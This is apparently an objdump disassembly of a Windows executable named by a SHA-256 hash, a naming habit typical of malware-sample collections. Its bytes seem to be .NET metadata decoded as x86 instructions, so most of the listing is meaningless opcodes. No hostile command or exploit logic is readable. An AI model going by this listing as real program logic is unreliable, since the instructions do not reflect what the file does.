
fdbad29d846785daeac792e56c7165685ecaf6f784931c86fb2ce8b085f3ba67.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	sar    BYTE PTR [eax+eax*1],1
  402003:	add    BYTE PTR [eax],al
  402005:	add    BYTE PTR [eax],al
  402007:	add    BYTE PTR [eax+0x0],cl
  40200a:	add    BYTE PTR [eax],al
  40200c:	add    al,BYTE PTR [eax]
  40200e:	add    eax,0x24d000
  402013:	add    ah,al
  402015:	pop    ss
  402016:	add    BYTE PTR [eax],al
  402018:	add    DWORD PTR [eax],eax
  40201a:	add    BYTE PTR [eax],al
  40201c:	add    al,0x0
  40201e:	add    BYTE PTR [esi],al
	...
  402050:	adc    esi,DWORD PTR [eax]
  402052:	add    al,BYTE PTR [eax]
  402054:	adc    eax,0x0
  402059:	add    BYTE PTR [eax],al
  40205b:	add    BYTE PTR [edx],al
  40205d:	and    eax,0x3128
  402062:	or     al,BYTE PTR [ebx]
  402064:	jge    0x402067
  402066:	add    BYTE PTR [eax],al
  402068:	add    al,0x2
  40206a:	add    al,0x7d
  40206c:	add    al,BYTE PTR [eax]
  40206e:	add    BYTE PTR [edx+ebp*1],al
  402071:	add    BYTE PTR [eax],al
  402073:	add    BYTE PTR [ebx],dl
  402075:	xor    BYTE PTR [ecx],al
  402077:	add    BYTE PTR [edi],al
  402079:	add    BYTE PTR [eax],al
  40207b:	add    BYTE PTR [eax],al
  40207d:	add    BYTE PTR [eax],al
  40207f:	add    BYTE PTR [edx],al
  402081:	jnp    0x402084
  402083:	add    BYTE PTR [eax],al
  402085:	add    al,0x2a
  402087:	add    BYTE PTR [ebx],dl
  402089:	xor    BYTE PTR [ecx],al
  40208b:	add    BYTE PTR [edi],al
  40208d:	add    BYTE PTR [eax],al
  40208f:	add    BYTE PTR [eax],al
  402091:	add    BYTE PTR [eax],al
  402093:	add    BYTE PTR [edx],al
  402095:	jnp    0x402099
  402097:	add    BYTE PTR [eax],al
  402099:	add    al,0x2a
  40209b:	add    BYTE PTR [ebx],bl
  40209d:	xor    BYTE PTR [edx],al
  40209f:	add    ch,dl
  4020a1:	add    BYTE PTR [eax],al
  4020a3:	add    BYTE PTR [ecx],al
  4020a5:	add    BYTE PTR [eax],al
  4020a7:	adc    DWORD PTR [edx],eax
  4020a9:	mov    gs,WORD PTR [ecx+0x18]
  4020ac:	das    
  4020ad:	add    DWORD PTR [edx],ebp
  4020af:	add    dl,BYTE PTR [esi]
  4020b1:	call   0x60b:0x9a17020a
  4020b8:	sub    BYTE PTR ds:0x2d0a0000,cl
  4020be:	or     BYTE PTR [edi],al
  4020c0:	sub    BYTE PTR ds:0x2c0a0000,cl
  4020c6:	add    DWORD PTR [edx],ebp
  4020c8:	pop    es
  4020c9:	outs   dx,DWORD PTR ds:[esi]
  4020ca:	push   cs
  4020cb:	add    BYTE PTR [eax],al
  4020cd:	or     dh,BYTE PTR [edx+0x1]
  4020d0:	add    BYTE PTR [eax],al
  4020d2:	jo     0x402143
  4020d4:	sldt   WORD PTR [eax]
  4020d7:	or     ch,BYTE PTR [eax+ecx*1]
  4020da:	jb     0x4020e7
  4020dc:	add    BYTE PTR [eax],al
  4020de:	jo     0x4020eb
  4020e0:	sub    esi,DWORD PTR [edx]
  4020e2:	pop    es
  4020e3:	outs   dx,DWORD PTR ds:[esi]
  4020e4:	push   cs
  4020e5:	add    BYTE PTR [eax],al
  4020e7:	or     dh,BYTE PTR [edx+0x17]
  4020ea:	add    BYTE PTR [eax],al
  4020ec:	jo     0x40215d
  4020ee:	sldt   WORD PTR [eax]
  4020f1:	or     ch,BYTE PTR [eax+ecx*1]
  4020f4:	jb     0x402115
  4020f6:	add    BYTE PTR [eax],al
  4020f8:	jo     0x402105
  4020fa:	sub    ebx,DWORD PTR [eax]
  4020fc:	pop    es
  4020fd:	outs   dx,DWORD PTR ds:[esi]
  4020fe:	push   cs
  4020ff:	add    BYTE PTR [eax],al
  402101:	or     dh,BYTE PTR [edx+0x2b]
  402104:	add    BYTE PTR [eax],al
  402106:	jo     0x402177
  402108:	sldt   WORD PTR [eax]
  40210b:	or     ch,BYTE PTR [esi+eax*1]
  40210e:	jb     0x402141
  402110:	add    BYTE PTR [eax],al
  402112:	jo     0x40211f
  402114:	pop    ds
  402115:	sbb    ch,BYTE PTR [eax]
  402117:	adc    BYTE PTR [eax],al
  402119:	add    BYTE PTR [edx],cl
  40211b:	or     al,0x28
  40211d:	adc    DWORD PTR [eax],eax
  40211f:	add    BYTE PTR [edx],cl
  402121:	push   es
  402122:	sub    BYTE PTR [edx],dl
  402124:	add    BYTE PTR [eax],al
  402126:	or     cl,BYTE PTR ds:0x12280908
  40212c:	add    BYTE PTR [eax],al
  40212e:	or     dl,BYTE PTR [ebx]
  402130:	add    al,0x11
  402132:	add    al,0x73
  402134:	adc    eax,DWORD PTR [eax]
  402136:	add    BYTE PTR [edx],cl
  402138:	adc    eax,DWORD PTR ds:0x146f0511
  40213e:	add    BYTE PTR [eax],al
  402140:	or     ch,BYTE PTR ds:0x6f051107
  402146:	adc    eax,0x110a0000
  40214b:	add    al,0x7e
  40214d:	add    eax,DWORD PTR [eax]
  40214f:	add    BYTE PTR [eax+ebp*1],al
  402152:	adc    al,BYTE PTR [eax]
  402154:	add    BYTE PTR [edx],cl
  402156:	adc    eax,DWORD PTR [ecx+edx*1]
  402159:	add    al,0x6
  40215b:	sub    BYTE PTR [esi],dl
  40215d:	add    BYTE PTR [eax],al
  40215f:	or     al,BYTE PTR [eax+0x4000004]
  402165:	jle    0x40216b
  402167:	add    BYTE PTR [eax],al
  402169:	add    al,0x7
  40216b:	outs   dx,DWORD PTR ds:[esi]
  40216c:	pop    ss
  40216d:	add    BYTE PTR [eax],al
  40216f:	or     dl,BYTE PTR [ecx]
  402171:	add    al,0x28
  402173:	add    eax,0xde060000
  402178:	add    esp,DWORD PTR [esi]
  40217a:	fiadd  WORD PTR [eax]
  40217c:	sub    al,BYTE PTR [eax]
  40217e:	add    BYTE PTR [eax],al
  402180:	add    DWORD PTR [eax],edx
  402182:	add    BYTE PTR [eax],al
  402184:	add    BYTE PTR [eax],al
  402186:	enter  0x900,0xd1
  40218a:	add    BYTE PTR [ebx],al
  40218c:	pop    ss
  40218d:	add    BYTE PTR [eax],al
  40218f:	add    DWORD PTR [ebx],edx
  402191:	xor    BYTE PTR ds:0x31e00,al
  402197:	add    BYTE PTR [edx],al
  402199:	add    BYTE PTR [eax],al
  40219b:	adc    DWORD PTR [edi],ebx
  40219d:	pop    ss
  40219e:	lea    edx,[ecx]
  4021a0:	add    BYTE PTR [eax],al
  4021a2:	add    DWORD PTR [edx],ecx
  4021a4:	push   es
  4021a5:	push   ss
  4021a6:	jb     0x4021e5
  4021a8:	add    BYTE PTR [eax],al
  4021aa:	jo     0x40214e
  4021ac:	push   es
  4021ad:	pop    ss
  4021ae:	jb     0x402219
  4021b0:	add    BYTE PTR [eax],al
  4021b2:	jo     0x402156
  4021b4:	jle    0x4021ba
  4021b6:	add    BYTE PTR [eax],al
  4021b8:	add    al,0x6f
  4021ba:	sbb    BYTE PTR [eax],al
  4021bc:	add    BYTE PTR [edx],cl
  4021be:	sub    al,0xa
  4021c0:	push   es
  4021c1:	sbb    BYTE PTR [edx+0x46],dh
  4021c4:	add    DWORD PTR [eax],eax
  4021c6:	jo     0x40216a
  4021c8:	sub    ecx,DWORD PTR [eax]
  4021ca:	push   es
  4021cb:	sbb    BYTE PTR [edx-0x6a],dh
  4021ce:	add    DWORD PTR [eax],eax
  4021d0:	jo     0x402174
  4021d2:	jle    0x4021d8
  4021d4:	add    BYTE PTR [eax],al
  4021d6:	add    al,0x6f
  4021d8:	sbb    DWORD PTR [eax],eax
  4021da:	add    BYTE PTR [edx],cl
  4021dc:	sub    BYTE PTR ds:0x2c0a0000,cl
  4021e2:	or     al,BYTE PTR [esi]
  4021e4:	sbb    DWORD PTR [edx-0x18],esi
  4021e7:	add    DWORD PTR [eax],eax
  4021e9:	jo     0x40218d
  4021eb:	sub    ebx,DWORD PTR [esi+eax*1]
  4021ee:	sbb    DWORD PTR [edx+0x8],esi
  4021f1:	add    al,BYTE PTR [eax]
  4021f3:	jo     0x402273
  4021f5:	add    al,0x0
  4021f7:	add    BYTE PTR [edi+ebp*2],al
  4021fa:	sbb    DWORD PTR [eax],eax
  4021fc:	add    BYTE PTR [edx],cl
  4021fe:	jb     0x402224
  402200:	add    al,BYTE PTR [eax]
  402202:	jo     0x40222c
  402204:	sbb    al,BYTE PTR [eax]
  402206:	add    BYTE PTR [edx],cl
  402208:	mov    ds:0x42721a06,al
  40220d:	add    al,BYTE PTR [eax]
  40220f:	jo     0x40228f
  402211:	add    al,0x0
  402213:	add    BYTE PTR [edi+ebp*2],al
  402216:	sbb    eax,DWORD PTR [eax]
  402218:	add    BYTE PTR [edx],cl
  40221a:	or     edx,DWORD PTR [edx]
  40221c:	add    DWORD PTR [eax],ebp
  40221e:	sbb    al,0x0
  402220:	add    BYTE PTR [edx],cl
  402222:	jb     0x40227e
  402224:	add    al,BYTE PTR [eax]
  402226:	jo     0x402250
  402228:	sbb    al,BYTE PTR [eax]
  40222a:	add    BYTE PTR [edx],cl
  40222c:	mov    ds:0x47e,al
  402231:	add    al,0x6f
  402233:	sbb    eax,0x280a0000
  402238:	or     eax,0x2c0a0000
  40223d:	or     al,BYTE PTR [esi]
  40223f:	sbb    esi,DWORD PTR [edx+0x74]
  402242:	add    al,BYTE PTR [eax]
  402244:	jo     0x4021e8
  402246:	sub    ebx,DWORD PTR [esi+eax*1]
  402249:	sbb    esi,DWORD PTR [edx-0x70]
  40224c:	add    al,BYTE PTR [eax]
  40224e:	jo     0x4022ce
  402250:	add    al,0x0
  402252:	add    BYTE PTR [edi+ebp*2],al
  402255:	sbb    eax,0x720a0000
  40225a:	test   al,0x2
  40225c:	add    BYTE PTR [eax+0x28],dh
  40225f:	sbb    al,BYTE PTR [eax]
  402261:	add    BYTE PTR [edx],cl
  402263:	mov    ds:0x47e,al
  402268:	add    al,0x6f
  40226a:	push   ds
  40226b:	add    BYTE PTR [eax],al
  40226d:	or     ch,BYTE PTR [eax]
  40226f:	or     eax,0x2c0a0000
  402274:	or     al,BYTE PTR [esi]
  402276:	sbb    al,0x72
  402278:	ret    0x2
  40227b:	jo     0x40221f
  40227d:	sub    ebx,DWORD PTR [esi+eax*1]
  402280:	sbb    al,0x72
  402282:	out    0x2,al
  402284:	add    BYTE PTR [eax+0x7e],dh
  402287:	add    al,0x0
  402289:	add    BYTE PTR [edi+ebp*2],al
  40228c:	push   ds
  40228d:	add    BYTE PTR [eax],al
  40228f:	or     dh,BYTE PTR [edx+0x6]
  402292:	add    eax,DWORD PTR [eax]
  402294:	jo     0x4022be
  402296:	sbb    al,BYTE PTR [eax]
  402298:	add    BYTE PTR [edx],cl
  40229a:	mov    ds:0x47e,al
  40229f:	add    al,0x6f
  4022a1:	pop    ds
  4022a2:	add    BYTE PTR [eax],al
  4022a4:	or     ch,BYTE PTR [edx+ecx*1]
  4022a7:	push   es
  4022a8:	sbb    eax,0x32872
  4022ad:	jo     0x402251
  4022af:	sub    ecx,DWORD PTR [eax]
  4022b1:	push   es
  4022b2:	sbb    eax,0x38c72
  4022b7:	jo     0x40225b
  4022b9:	jle    0x4022bf
  4022bb:	add    BYTE PTR [eax],al
  4022bd:	add    al,0x6f
  4022bf:	and    BYTE PTR [eax],al
  4022c1:	add    BYTE PTR [edx],cl
  4022c3:	sub    al,0xa
  4022c5:	push   es
  4022c6:	push   ds
  4022c7:	jb     0x4022bb
  4022c9:	add    eax,DWORD PTR [eax]
  4022cb:	jo     0x40226f
  4022cd:	sub    ecx,DWORD PTR [eax]
  4022cf:	push   es
  4022d0:	push   ds
  4022d1:	jb     0x402309
  4022d3:	add    al,0x0
  4022d5:	jo     0x402279
  4022d7:	jle    0x4022dd
  4022d9:	add    BYTE PTR [eax],al
  4022db:	add    al,0x6f
  4022dd:	and    DWORD PTR [eax],eax
  4022df:	add    BYTE PTR [edx],cl
  4022e1:	sub    al,0xb
  4022e3:	push   es
  4022e4:	pop    ds
  4022e5:	or     DWORD PTR [edx+0x7c],esi
  4022e8:	add    al,0x0
  4022ea:	jo     0x40228e
  4022ec:	sub    ecx,DWORD PTR [ecx]
  4022ee:	push   es
  4022ef:	pop    ds
  4022f0:	or     DWORD PTR [edx-0x44],esi
  4022f3:	add    al,0x0
  4022f5:	jo     0x402299
  4022f7:	jle    0x4022fd
  4022f9:	add    BYTE PTR [eax],al
  4022fb:	add    al,0x6f
  4022fd:	and    al,BYTE PTR [eax]
  4022ff:	add    BYTE PTR [edx],cl
  402301:	sub    al,0xb
  402303:	push   es
  402304:	pop    ds
  402305:	or     dh,BYTE PTR [edx-0x2]
  402308:	add    al,0x0
  40230a:	jo     0x4022ae
  40230c:	sub    ecx,DWORD PTR [ecx]
  40230e:	push   es
  40230f:	pop    ds
  402310:	or     dh,BYTE PTR [edx+0x42]
  402313:	add    eax,0x7ea27000
  402318:	add    al,0x0
  40231a:	add    BYTE PTR [edi+ebp*2],al
  40231d:	and    eax,DWORD PTR [eax]
  40231f:	add    BYTE PTR [edx],cl
  402321:	sub    al,0xb
  402323:	push   es
  402324:	pop    ds
  402325:	or     esi,DWORD PTR [edx-0x78]
  402328:	add    eax,0x2ba27000
  40232d:	or     DWORD PTR [esi],eax
  40232f:	pop    ds
  402330:	or     esi,DWORD PTR [edx-0x1c]
  402333:	add    eax,0x7ea27000
  402338:	add    al,0x0
  40233a:	add    BYTE PTR [edi+ebp*2],al
  40233d:	and    al,0x0
  40233f:	add    BYTE PTR [edx],cl
  402341:	sub    BYTE PTR ds:0x2c0a0000,cl
  402347:	or     eax,DWORD PTR [esi]
  402349:	pop    ds
  40234a:	or     al,0x72
  40234c:	inc    edx
  40234d:	push   es
  40234e:	add    BYTE PTR [eax-0x5e],dh
  402351:	sub    ebx,DWORD PTR ds:0x720c1f06
  402357:	pop    esp
  402358:	push   es
  402359:	add    BYTE PTR [eax+0x7e],dh
  40235c:	add    al,0x0
  40235e:	add    BYTE PTR [edi+ebp*2],al
  402361:	and    al,0x0
  402363:	add    BYTE PTR [edx],cl
  402365:	jb     0x4023d9
  402367:	push   es
  402368:	add    BYTE PTR [eax+0x28],dh
  40236b:	sbb    al,BYTE PTR [eax]
  40236d:	add    BYTE PTR [edx],cl
  40236f:	mov    ds:0x47e,al
  402374:	add    al,0x6f
  402376:	and    eax,0x2c0a0000
  40237b:	or     eax,DWORD PTR [esi]
  40237d:	pop    ds
  40237e:	or     eax,0x68a72
  402383:	jo     0x402327
  402385:	sub    ecx,DWORD PTR [ecx]
  402387:	push   es
  402388:	pop    ds
  402389:	or     eax,0x6ea72
  40238e:	jo     0x402332
  402390:	jle    0x402396
  402392:	add    BYTE PTR [eax],al
  402394:	add    al,0x6f
  402396:	add    BYTE PTR es:[eax],al
  402399:	or     ch,BYTE PTR [ebx+ecx*1]
  40239c:	push   es
  40239d:	pop    ds
  40239e:	push   cs
  40239f:	jb     0x4023ed
  4023a1:	pop    es
  4023a2:	add    BYTE PTR [eax-0x5e],dh
  4023a5:	sub    ecx,DWORD PTR [ecx]
  4023a7:	push   es
  4023a8:	pop    ds
  4023a9:	push   cs
  4023aa:	jb     0x40235c
  4023ac:	pop    es
  4023ad:	add    BYTE PTR [eax-0x5e],dh
  4023b0:	jle    0x4023b6
  4023b2:	add    BYTE PTR [eax],al
  4023b4:	add    al,0x6f
  4023b6:	daa    
  4023b7:	add    BYTE PTR [eax],al
  4023b9:	or     ch,BYTE PTR [ebx+ecx*1]
  4023bc:	push   es
  4023bd:	pop    ds
  4023be:	(bad)  
  4023c0:	push   ss
  4023c1:	or     BYTE PTR [eax],al
  4023c3:	jo     0x402367
  4023c5:	sub    ecx,DWORD PTR [ecx]
  4023c7:	push   es
  4023c8:	pop    ds
  4023c9:	(bad)  
  4023cb:	push   0x8
  4023cd:	add    BYTE PTR [eax-0x5e],dh
  4023d0:	jle    0x4023d6
  4023d2:	add    BYTE PTR [eax],al
  4023d4:	add    al,0x6f
  4023d6:	sub    BYTE PTR [eax],al
  4023d8:	add    BYTE PTR [edx],cl
  4023da:	sub    al,0xb
  4023dc:	push   es
  4023dd:	pop    ds
  4023de:	adc    BYTE PTR [edx-0x40],dh
  4023e1:	or     BYTE PTR [eax],al
  4023e3:	jo     0x402387
  4023e5:	sub    ecx,DWORD PTR [ecx]
  4023e7:	push   es
  4023e8:	pop    ds
  4023e9:	adc    BYTE PTR [edx+0x20],dh
  4023ec:	or     DWORD PTR [eax],eax
  4023ee:	jo     0x402392
  4023f0:	jle    0x4023f6
  4023f2:	add    BYTE PTR [eax],al
  4023f4:	add    al,0x6f
  4023f6:	sub    DWORD PTR [eax],eax
  4023f8:	add    BYTE PTR [edx],cl
  4023fa:	sub    BYTE PTR ds:0x2c0a0000,cl
  402400:	or     eax,DWORD PTR [esi]
  402402:	pop    ds
  402403:	adc    DWORD PTR [edx-0x7e],esi
  402406:	or     DWORD PTR [eax],eax
  402408:	jo     0x4023ac
  40240a:	sub    ebx,DWORD PTR ds:0x72111f06
  402410:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402411:	or     DWORD PTR [eax],eax
  402413:	jo     0x402493
  402415:	add    al,0x0
  402417:	add    BYTE PTR [edi+ebp*2],al
  40241a:	sub    DWORD PTR [eax],eax
  40241c:	add    BYTE PTR [edx],cl
  40241e:	jb     0x4023e2
  402420:	or     DWORD PTR [eax],eax
  402422:	jo     0x40244c
  402424:	sbb    al,BYTE PTR [eax]
  402426:	add    BYTE PTR [edx],cl
  402428:	mov    ds:0x47e,al
  40242d:	add    al,0x6f
  40242f:	sub    al,BYTE PTR [eax]
  402431:	add    BYTE PTR [edx],cl
  402433:	sub    al,0xb
  402435:	push   es
  402436:	pop    ds
  402437:	adc    dh,BYTE PTR [edx-0x1e]
  40243a:	or     DWORD PTR [eax],eax
  40243c:	jo     0x4023e0
  40243e:	sub    ecx,DWORD PTR [ecx]
  402440:	push   es
  402441:	pop    ds
  402442:	adc    dh,BYTE PTR [edx+0x1a]
  402445:	or     al,BYTE PTR [eax]
  402447:	jo     0x4023eb
  402449:	jle    0x40244f
  40244b:	add    BYTE PTR [eax],al
  40244d:	add    al,0x6f
  40244f:	sub    eax,DWORD PTR [eax]
  402451:	add    BYTE PTR [edx],cl
  402453:	sub    al,0xb
  402455:	push   es
  402456:	pop    ds
  402457:	adc    esi,DWORD PTR [edx+0x54]
  40245a:	or     al,BYTE PTR [eax]
  40245c:	jo     0x402400
  40245e:	sub    ecx,DWORD PTR [ecx]
  402460:	push   es
  402461:	pop    ds
  402462:	adc    esi,DWORD PTR [edx-0x54]
  402465:	or     al,BYTE PTR [eax]
  402467:	jo     0x40240b
  402469:	jle    0x40246f
  40246b:	add    BYTE PTR [eax],al
  40246d:	add    al,0x6f
  40246f:	sub    al,0x0
  402471:	add    BYTE PTR [edx],cl
  402473:	sub    al,0xb
  402475:	push   es
  402476:	pop    ds
  402477:	adc    al,0x72
  402479:	push   es
  40247a:	or     eax,DWORD PTR [eax]
  40247c:	jo     0x402420
  40247e:	sub    ecx,DWORD PTR [ecx]
  402480:	push   es
  402481:	pop    ds
  402482:	adc    al,0x72
  402484:	or     BYTE PTR [ebx],0x0
  402487:	jo     0x40242b
  402489:	jle    0x40248f
  40248b:	add    BYTE PTR [eax],al
  40248d:	add    al,0x6f
  40248f:	sub    eax,0x2c0a0000
  402494:	or     eax,DWORD PTR [esi]
  402496:	pop    ds
  402497:	adc    eax,0xc0072
  40249c:	jo     0x402440
  40249e:	sub    ecx,DWORD PTR [ecx]
  4024a0:	push   es
  4024a1:	pop    ds
  4024a2:	adc    eax,0xc5472
  4024a7:	jo     0x40244b
  4024a9:	push   es
  4024aa:	pop    ds
  4024ab:	push   ss
  4024ac:	jb     0x402458
  4024ae:	or     al,0x0
  4024b0:	jo     0x402454
  4024b2:	add    al,BYTE PTR [esi]
  4024b4:	sub    BYTE PTR [esi],ch
  4024b6:	add    BYTE PTR [eax],al
  4024b8:	or     ch,BYTE PTR [edx]
  4024ba:	push   ds
  4024bb:	add    ch,BYTE PTR [eax]
  4024bd:	das    
  4024be:	add    BYTE PTR [eax],al
  4024c0:	or     ch,BYTE PTR [edx]
  4024c2:	cs jb  0x402487
  4024c5:	or     al,0x0
  4024c7:	jo     0x402449
  4024c9:	add    eax,DWORD PTR [eax]
  4024cb:	add    BYTE PTR [edx+ebp*1],al
  4024ce:	add    BYTE PTR [eax],al
  4024d0:	inc    edx
  4024d1:	push   ebx
  4024d2:	dec    edx
  4024d3:	inc    edx
  4024d4:	add    DWORD PTR [eax],eax
  4024d6:	add    DWORD PTR [eax],eax
  4024d8:	add    BYTE PTR [eax],al
  4024da:	add    BYTE PTR [eax],al
  4024dc:	or     al,0x0
  4024de:	add    BYTE PTR [eax],al
  4024e0:	jbe    0x402514
  4024e2:	xor    BYTE PTR cs:[esi],ch
  4024e5:	xor    eax,0x37323730
  4024ea:	add    BYTE PTR [eax],al
  4024ec:	add    BYTE PTR [eax],al
  4024ee:	add    eax,0x6c00
  4024f3:	add    BYTE PTR [eax+0x23000003],ah
  4024f9:	jle    0x4024fb
  4024fb:	add    BYTE PTR [esp+eax*1],cl
  4024fe:	add    BYTE PTR [eax],al
  402500:	sbb    al,0x5
  402502:	add    BYTE PTR [eax],al
  402504:	and    edx,DWORD PTR [ebx+0x74]
  402507:	jb     0x402572
  402509:	outs   dx,BYTE PTR ds:[esi]
  40250a:	addr16 jae 0x40250d
  40250d:	add    BYTE PTR [eax],al
  40250f:	add    BYTE PTR [eax],ch
  402511:	or     DWORD PTR [eax],eax
  402513:	add    ah,bl
  402515:	or     al,0x0
  402517:	add    BYTE PTR [ebx],ah
  402519:	push   ebp
  40251a:	push   ebx
  40251b:	add    BYTE PTR [esi+edx*1],al
  40251e:	add    BYTE PTR [eax],al
  402520:	adc    BYTE PTR [eax],al
  402522:	add    BYTE PTR [eax],al
  402524:	and    eax,DWORD PTR [edi+0x55]
  402527:	dec    ecx
  402528:	inc    esp
  402529:	add    BYTE PTR [eax],al
  40252b:	add    BYTE PTR [esi+edx*1],dl
  40252e:	add    BYTE PTR [eax],al
  402530:	mov    al,0x1
  402532:	add    BYTE PTR [eax],al
  402534:	and    eax,DWORD PTR [edx+0x6c]
  402537:	outs   dx,DWORD PTR ds:[esi]
  402538:	bound  eax,QWORD PTR [eax]
  40253a:	add    BYTE PTR [eax],al
  40253c:	add    BYTE PTR [eax],al
  40253e:	add    BYTE PTR [eax],al
  402540:	add    al,BYTE PTR [eax]
  402542:	add    BYTE PTR [eax],al
  402544:	push   edi
  402545:	adc    eax,0x901a2
  40254a:	add    BYTE PTR [eax],al
  40254c:	add    dl,bh
  40254e:	add    DWORD PTR [ebx],esi
  402550:	add    BYTE PTR [esi],dl
  402552:	add    BYTE PTR [eax],al
  402554:	add    DWORD PTR [eax],eax
  402556:	add    BYTE PTR [eax],al
  402558:	sbb    eax,DWORD PTR [eax]
  40255a:	add    BYTE PTR [eax],al
  40255c:	add    eax,DWORD PTR [eax]
  40255e:	add    BYTE PTR [eax],al
  402560:	add    al,0x0
  402562:	add    BYTE PTR [eax],al
  402564:	pop    es
  402565:	add    BYTE PTR [eax],al
  402567:	add    BYTE PTR [eax+eax*1],al
  40256a:	add    BYTE PTR [eax],al
  40256c:	xor    DWORD PTR [eax],eax
  40256e:	add    BYTE PTR [eax],al
  402570:	sldt   WORD PTR [eax]
  402573:	add    BYTE PTR [edx],al
  402575:	add    BYTE PTR [eax],al
  402577:	add    BYTE PTR [ecx],al
  402579:	add    BYTE PTR [eax],al
  40257b:	add    BYTE PTR [edx],al
  40257d:	add    BYTE PTR [eax],al
  40257f:	add    BYTE PTR [edx],al
  402581:	add    BYTE PTR [eax],al
  402583:	add    BYTE PTR [ecx],al
  402585:	add    BYTE PTR [eax],al
  402587:	add    BYTE PTR [edx],al
  402589:	add    BYTE PTR [eax],al
  40258b:	add    BYTE PTR [eax],al
  40258d:	add    BYTE PTR [ecx+0x104],cl
  402593:	add    BYTE PTR [eax],al
  402595:	add    BYTE PTR [esi],al
  402597:	add    BYTE PTR [eax+eax*1],bl
  40259a:	or     al,BYTE PTR [eax]
  40259c:	push   es
  40259d:	add    BYTE PTR [ecx],bh
  40259f:	add    BYTE PTR [edx],cl
  4025a1:	add    BYTE PTR [esi],al
  4025a3:	add    BYTE PTR [esi+0x0],dl
  4025a6:	or     al,BYTE PTR [eax]
  4025a8:	push   es
  4025a9:	add    BYTE PTR [ebp+0x0],dh
  4025ac:	or     al,BYTE PTR [eax]
  4025ae:	push   es
  4025af:	add    BYTE PTR [esi+0x6000a00],cl
  4025b5:	add    BYTE PTR [edi+0x6000a00],ah
  4025bb:	add    dl,al
  4025bd:	add    BYTE PTR [edx],cl
  4025bf:	add    BYTE PTR [esi],al
  4025c1:	add    ah,bh
  4025c3:	add    ch,bl
  4025c5:	add    BYTE PTR [esi],al
  4025c7:	add    BYTE PTR [eax],dl
  4025c9:	add    ebp,ebx
  4025cb:	add    BYTE PTR [esi],al
  4025cd:	add    BYTE PTR [esi],bl
  4025cf:	add    DWORD PTR [edx],ecx
  4025d1:	add    BYTE PTR [esi],al
  4025d3:	add    BYTE PTR [ebx+0x1],bl
  4025d6:	cmp    eax,DWORD PTR [ecx]
  4025d8:	push   es
  4025d9:	add    BYTE PTR [ebx+0x1],bh
  4025dc:	cmp    eax,DWORD PTR [ecx]
  4025de:	push   es
  4025df:	add    BYTE PTR [eax+0x6019901],ah
  4025e5:	add    BYTE PTR [edi+0xa019901],ah
  4025eb:	add    ch,cl
  4025ed:	add    DWORD PTR [ecx-0x1ffff9ff],esi
  4025f3:	add    esi,edx
  4025f5:	add    DWORD PTR [esi],eax
  4025f7:	add    dh,ch
  4025f9:	add    DWORD PTR [ecx+0x12000601],ebx
  4025ff:	add    bl,BYTE PTR [ecx+0x1e004b01]
  402605:	add    al,BYTE PTR [eax]
  402607:	add    BYTE PTR [edx],cl
  402609:	add    BYTE PTR [edx],bh
  40260b:	add    dh,BYTE PTR [ecx+0x54000601]
  402611:	add    dl,dh
  402613:	add    DWORD PTR [esi],eax
  402615:	add    BYTE PTR [ecx+0x2],ah
  402618:	(bad)  
  402619:	add    DWORD PTR [esi],eax
  40261b:	add    BYTE PTR [ebx+0x601d602],bl
  402621:	add    al,ah
  402623:	add    bl,BYTE PTR [ecx+0x4d000601]
  402629:	add    al,0xd6
  40262b:	add    DWORD PTR [esi],eax
  40262d:	add    BYTE PTR [eax+0x4],ah
  402630:	cdq    
  402631:	add    DWORD PTR [esi],eax
  402633:	add    BYTE PTR [eax+0x4],bh
  402636:	cdq    
  402637:	add    DWORD PTR [eax],eax
  402639:	add    BYTE PTR [eax],al
  40263b:	add    BYTE PTR [ecx],al
  40263d:	add    BYTE PTR [eax],al
  40263f:	add    BYTE PTR [eax],al
  402641:	add    BYTE PTR [ecx],al
  402643:	add    BYTE PTR [ecx],al
  402645:	add    BYTE PTR [ecx],al
  402647:	add    DWORD PTR [eax],edx
  402649:	add    ah,cl
  40264b:	add    al,0x0
  40264d:	add    BYTE PTR [ecx],bh
  40264f:	add    BYTE PTR [ecx],al
  402651:	add    BYTE PTR [ecx],al
  402653:	add    BYTE PTR [eax],al
  402655:	add    BYTE PTR [eax],dl
  402657:	add    cl,ah
  402659:	add    al,0x0
  40265b:	add    BYTE PTR ds:0x4000300,dh
  402661:	add    BYTE PTR [ecx],al
  402663:	add    bl,ah
  402665:	add    al,0x6d
  402667:	add    BYTE PTR [ecx],al
  402669:	add    ch,ah
  40266b:	add    al,0x70
  40266d:	add    BYTE PTR [ecx],dh
  40266f:	add    bl,ah
  402671:	add    al,0x6d
  402673:	add    BYTE PTR [ecx],dl
  402675:	add    bh,ah
  402677:	add    al,0x79
  402679:	add    BYTE PTR [eax+0x20],dl
  40267c:	add    BYTE PTR [eax],al
  40267e:	add    BYTE PTR [eax],al
  402680:	xchg   BYTE PTR [eax],bl
  402682:	xor    eax,DWORD PTR [eax]
  402684:	jae    0x402686
  402686:	add    DWORD PTR [eax],eax
  402688:	je     0x4026aa
  40268a:	add    BYTE PTR [eax],al
  40268c:	add    BYTE PTR [eax],al
  40268e:	xchg   BYTE PTR [eax],al
  402690:	jecxz  0x402696
  402692:	sbb    DWORD PTR [eax],eax
  402694:	add    eax,DWORD PTR [eax]
  402696:	mov    BYTE PTR [eax],ah
  402698:	add    BYTE PTR [eax],al
  40269a:	add    BYTE PTR [eax],al
  40269c:	xchg   BYTE PTR [eax],al
  40269e:	in     eax,0x4
  4026a0:	inc    esp
  4026a1:	add    BYTE PTR [ebx],al
  4026a3:	add    BYTE PTR [eax+eiz*1+0x0],bl
  4026aa:	xchg   ecx,eax
  4026ab:	add    bl,ah
  4026ad:	add    al,0x7d
  4026af:	add    BYTE PTR [ebx],al
  4026b1:	add    BYTE PTR [eax+0x21],dl
  4026b7:	add    BYTE PTR [ecx-0x7cfb1d00],dl
  4026bd:	add    BYTE PTR [eax+eax*1],al
  4026c0:	mov    edx,0x24
  4026c5:	add    BYTE PTR [esi+0x10003318],al
  4026cb:	add    BYTE PTR ds:0x24c200,al
  4026d1:	add    BYTE PTR [eax],al
  4026d3:	add    BYTE PTR [ecx-0x77fb12e8],dl
  4026d9:	add    BYTE PTR ds:0x1000000,al
  4026df:	add    bl,ah
  4026e1:	add    al,0x0
  4026e3:	add    BYTE PTR [edx],al
  4026e5:	add    ch,ah
  4026e7:	add    al,0x0
  4026e9:	add    BYTE PTR [ecx],al
  4026eb:	add    cl,ch
  4026ed:	add    al,0x0
  4026ef:	add    BYTE PTR [ecx],al
  4026f1:	add    cl,ch
